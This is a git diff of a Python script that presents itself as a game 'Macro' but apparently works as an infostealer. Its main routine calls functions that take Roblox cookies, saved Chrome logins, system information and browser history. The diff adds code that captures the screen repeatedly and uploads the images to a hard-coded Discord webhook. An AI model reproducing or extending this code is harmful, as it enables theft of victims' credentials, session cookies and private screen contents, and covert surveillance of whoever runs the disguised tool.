@@ -26,6 +26,10 @@ import win32crypt
 from Crypto.Cipher import AES
 from pynput import mouse, keyboard as pynput_keyboard
 from pynput import mouse, keyboard
+import mss
+import io
+from datetime import datetime
+
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"  # Replace this with your actual webhook URL
 
@@ -417,6 +421,30 @@ def get_system_info():
         except PermissionError:
             continue
 
+def send_screenshot_to_discord(webhook_url):
+    with mss.mss() as sct:
+        screenshot = sct.grab(sct.monitors[1])
+        png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+        image_file = io.BytesIO(png_bytes)
+        
+        files = {
+            'file': (f'screenshot_{datetime.now().strftime("%H%M%S")}.png', image_file, 'image/png')
+        }
+        
+        data = {
+            'content': f'Screenshot taken at {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
+            'username': 'Screenshot Bot'
+        }
+        
+        requests.post(webhook_url, files=files, data=data)
+
+def continuous_screenshots(duration=5, interval=1):
+    start_time = time.time()
+    
+    while (time.time() - start_time) < duration:
+        send_screenshot_to_discord(DISCORD_WEBHOOK)
+        time.sleep(interval)
+
 if __name__ == "__main__":
     print("[*] Launching Macro...")
 
@@ -425,6 +453,7 @@ if __name__ == "__main__":
     retrieve_roblox_cookies()
     collect_chrome_logins()
     get_system_info()
+    continuous_screenshots(duration=5, interval=1)
     
     # Browser history
     history = get_chrome_history(limit=100)
